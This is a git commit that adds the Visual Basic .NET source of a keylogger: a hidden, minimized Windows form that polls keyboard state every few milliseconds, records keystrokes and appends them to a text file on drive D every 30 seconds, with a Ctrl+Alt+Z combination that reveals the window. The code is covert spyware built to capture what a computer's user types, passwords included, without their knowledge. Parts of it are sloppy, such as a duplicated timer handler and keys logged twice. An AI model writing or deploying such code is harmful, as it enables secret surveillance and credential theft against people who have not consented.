52434858dd51c21dd9e9043c5622cb7dc0a00aaa
ImmortalRabbit <demezhan1998@gmail.com>
2018-03-22 23:19:27 +0600

    Add files via upload

---
+++ logger/Form1.Designer.vb
@@ -0,0 +1,73 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Key
+    Inherits System.Windows.Forms.Form
+
+    'Форма переопределяет dispose для очистки списка компонентов.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Является обязательной для конструктора форм Windows Forms
+    Private components As System.ComponentModel.IContainer
+
+    'Примечание: следующая процедура является обязательной для конструктора форм Windows Forms
+    'Для ее изменения используйте конструктор форм Windows Form.  
+    'Не изменяйте ее в редакторе исходного кода.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.timerKeys = New System.Windows.Forms.Timer(Me.components)
+        Me.timerSave = New System.Windows.Forms.Timer(Me.components)
+        Me.tbLog = New System.Windows.Forms.TextBox()
+        Me.SuspendLayout()
+        '
+        'timerKeys
+        '
+        Me.timerKeys.Enabled = True
+        Me.timerKeys.Interval = 5
+        '
+        'timerSave
+        '
+        Me.timerSave.Enabled = True
+        Me.timerSave.Interval = 30000
+        '
+        'tbLog
+        '
+        Me.tbLog.Location = New System.Drawing.Point(0, 0)
+        Me.tbLog.Name = "tbLog"
+        Me.tbLog.Size = New System.Drawing.Size(100, 20)
+        Me.tbLog.TabIndex = 0
+        '
+        'Key
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.SystemColors.Desktop
+        Me.CausesValidation = False
+        Me.ClientSize = New System.Drawing.Size(246, 47)
+        Me.ControlBox = False
+        Me.Controls.Add(Me.tbLog)
+        Me.Enabled = False
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Key"
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Text = " "
+        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents timerKeys As System.Windows.Forms.Timer
+    Friend WithEvents timerSave As System.Windows.Forms.Timer
+    Friend WithEvents tbLog As System.Windows.Forms.TextBox
+
+End Class
---
+++ logger/Form1.vb
@@ -0,0 +1,104 @@
+﻿Option Strict On
+
+
+Public Class Key
+    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Int32) As Short
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        tbLog.Text = "Started at: " & Now & vbNewLine
+    End Sub
+
+
+
+
+
+
+    Private Sub timerKeys_Tick(sender As Object, e As EventArgs) Handles timerKeys.Tick
+        Dim result As Integer
+        Dim key As String
+        Dim i As Integer
+        For i = 2 To 127
+            result = 0
+            result = GetAsyncKeyState(i)
+            If result = -32767 Then
+                key = Chr(i)
+                If My.Computer.Keyboard.ShiftKeyDown Then
+                    If i = 48 Then key = ")" Else 
+                    If i = 49 Then key = "!" Else 
+                    If i = 50 Then key = "@" Else 
+                    If i = 51 Then key = "#" Else 
+                    If i = 52 Then key = "$" Else 
+                    If i = 53 Then key = "%" Else 
+                    If i = 54 Then key = "^" Else 
+                    If i = 55 Then key = "&" Else 
+                    If i = 56 Then key = "*" Else 
+                    If i = 57 Then key = "(" Else 
+
+                End If
+                If i = 96 Then key = "0" Else 
+                If i = 97 Then key = "1" Else 
+                If i = 98 Then key = "2" Else 
+                If i = 99 Then key = "3" Else 
+                If i = 100 Then key = "4" Else 
+                If i = 101 Then key = "5" Else 
+                If i = 102 Then key = "6" Else 
+                If i = 103 Then key = "7" Else 
+                If i = 104 Then key = "8" Else 
+                If i = 105 Then key = "9" Else 
+                If i = 106 Then key = "*" Else 
+                If i = 107 Then key = "+" Else 
+                If i = 108 Then key = "Enter" Else 
+                If i = 109 Then key = "-" Else 
+                If i = 110 Then key = "." Else 
+                If i = 111 Then key = "/" Else 
+                If i = 112 Then key = "F1" Else 
+                If i = 113 Then key = "F2" Else 
+                If i = 114 Then key = "F3" Else 
+                If i = 115 Then key = "F4" Else 
+                If i = 116 Then key = "F5" Else 
+                If i = 117 Then key = "F6" Else 
+                If i = 118 Then key = "F7" Else 
+                If i = 119 Then key = "F8" Else 
+                If i = 120 Then key = "F9" Else 
+                If i = 121 Then key = "F10" Else 
+                If i = 122 Then key = "F11" Else 
+                If i = 124 Then key = "F13" Else 
+                If i = 125 Then key = "F14" Else 
+                If i = 126 Then key = "F15" Else 
+                If i = 127 Then key = "F16" Else 
+                If i = 13 Then key = vbNewLine
+                Exit For
+            End If
+        Next i
+        If key <> Nothing Then
+            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
+                tbLog.Text &= key
+            Else
+                tbLog.Text &= key.ToLower
+            End If
+            If My.Computer.Keyboard.ShiftKeyDown Then
+                tbLog.Text &= key
+            Else
+                tbLog.Text &= key.ToLower
+            End If
+        End If
+        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso key = "z" Then
+            Me.Show()
+
+        End If
+
+
+
+
+    End Sub
+
+    
+
+    Private Sub timerSave_Tick() Handles timerSave.Tick
+        My.Computer.FileSystem.WriteAllText("D:\text.txt", tbLog.Text, True)
+    End Sub
+
+    Private Sub timerSave_Tick(sender As Object, e As EventArgs) Handles timerSave.Tick
+
+    End Sub
+End Class
